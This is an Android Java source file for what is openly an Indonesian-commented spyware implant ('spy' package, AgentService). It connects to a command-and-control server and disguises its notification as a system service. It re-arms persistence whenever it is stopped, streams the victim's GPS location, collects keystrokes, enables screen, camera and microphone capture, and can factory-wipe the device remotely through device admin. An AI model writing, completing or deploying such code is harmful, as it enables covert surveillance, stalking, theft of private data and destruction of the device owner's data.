package ai.m4zk1play.spy;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/** Service utama: koneksi C2, lokasi, buffer keylog, persistence. */
public class AgentService extends Service implements C2Client.Sink {

    public static AgentService instance;

    private static final int NOTIF_ID = 0x4d5a;

    private C2Client client;
    private MediaModule media;
    private ScreenModule screen;
    private Router router;
    private LocationManager lm;
    private LocationListener listener;
    private boolean locating;
    private Boolean rootCache;
    private int fgType = 0;
    private final List<String> keys = new ArrayList<>();

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        startFg();

        Keys k = Keys.read(this);
        client = new C2Client(k, this);
        media = new MediaModule();
        media.bind(this, client);
        screen = new ScreenModule();
        screen.bind(client);
        router = new Router(this, client, media, screen);

        Persist.arm(this);
        client.connect();
    }

    private void startFg() {
        startFgWith(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
    }

    private void startFgWith(int type) {
        if (type == fgType) return;
        String ch = "mzk_core";
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26 && nm != null) {
            NotificationChannel c = new NotificationChannel(ch, "Layanan sistem",
                    NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            nm.createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch) : new Notification.Builder(this);
        Notification n = b.setContentTitle("Layanan sistem")
                .setContentText("Berjalan normal")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
        try {
            if (Build.VERSION.SDK_INT >= 29) startForeground(NOTIF_ID, n, type);
            else startForeground(NOTIF_ID, n);
            fgType = type;
        } catch (Exception e) {
            try {
                startForeground(NOTIF_ID, n);
                fgType = 0;
            } catch (Exception ignored) {
            }
        }
    }

    /** Naikkan tipe FGS saat projection aktif. Panggil dari activity yang terlihat. */
    public void upgradeFg() {
        if (Build.VERSION.SDK_INT >= 29) {
            startFgWith(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Persist.arm(this);
        if (client == null) {
            Keys k = Keys.read(this);
            client = new C2Client(k, this);
            client.connect();
        }
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent root) {
        Persist.arm(this);
        BootProvider.start(this);
        super.onTaskRemoved(root);
    }

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }

    @Override
    public void onDestroy() {
        instance = null;
        try { media.stopAll(); } catch (Exception ignored) { }
        try { screen.stop(); } catch (Exception ignored) { }
        try { client.stop(); } catch (Exception ignored) { }
        Persist.arm(this);
        super.onDestroy();
    }

    @Override
    public void onReady() {
    }

    @Override
    public void onCommand(String id, String type, JSONObject args) {
        router.handle(id, type, args);
    }

    @Override
    public void onDown() {
    }

    public void reconnect() {
        try { client.stop(); } catch (Exception ignored) { }
        client = new C2Client(Keys.read(this), this);
        client.connect();
    }

    public boolean isRoot() {
        if (rootCache == null) rootCache = Modules.root();
        return rootCache;
    }

    public String wipe() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(cn)) {
                dpm.wipeData(0);
                return "wipe dipicu";
            }
            return "butuh device admin aktif";
        } catch (Exception e) {
            return "gagal: " + e.getMessage();
        }
    }

    public void startLocate() {
        if (locating) return;
        locating = true;
        lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location loc) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("lat", loc.getLatitude());
                    o.put("lon", loc.getLongitude());
                    o.put("acc", loc.getAccuracy());
                    if (client != null) client.stream("loc", "", o);
                } catch (Exception ignored) {
                }
            }

            @Override
            public void onStatusChanged(String p, int s, android.os.Bundle b) {
            }

            @Override
            public void onProviderEnabled(String p) {
            }

            @Override
            public void onProviderDisabled(String p) {
            }
        };
        try {
            if (lm != null) {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 2f,
                        listener, Looper.getMainLooper());
                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 4f,
                        listener, Looper.getMainLooper());
            }
        } catch (Exception ignored) {
        }
    }

    public void stopLocate() {
        locating = false;
        try {
            if (lm != null && listener != null) lm.removeUpdates(listener);
        } catch (Exception ignored) {
        }
        listener = null;
    }

    public void needProjection() {
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(i);
    }

    /** Dipanggil dari MainActivity setelah izin projection diberikan. */
    public void setProjection(Intent data, int resultCode) {
        if (data == null) return;
        upgradeFg();
        screen.start(this, data, resultCode);
    }

    public JSONObject netInfo() {
        JSONObject o = new JSONObject();
        try {
            o.put("local_ip", Modules.ip(this));
            o.put("battery", Modules.battery(this));
            o.put("charging", Modules.charging(this));
            o.put("online", Modules.online(this));
            o.put("root", isRoot());
            o.put("notif", NotifListener.alive());
            o.put("keylog", KeylogService.alive());
        } catch (Exception ignored) {
        }
        return o;
    }

    public JSONArray drainKeys() {
        JSONArray a = new JSONArray();
        synchronized (keys) {
            for (String k : keys) a.put(k);
            keys.clear();
        }
        return a;
    }

    public void pushLive(String kind, String line) {
        if (client != null) client.stream(kind, line, null);
    }

    public void delayMode() {
        new Thread(() -> {
            long end = System.currentTimeMillis() + 8000;
            while (System.currentTimeMillis() < end) {
                for (int i = 0; i < 500000; i++) Math.sqrt(i);
            }
        }, "mzk-delay").start();
    }

    /** Dipakai Router untuk menghentikan service. */
    public void kill() {
        stopSelf();
    }

    /** Activity aktif untuk permintaan izin layar. */
    public Activity activityRef;
}
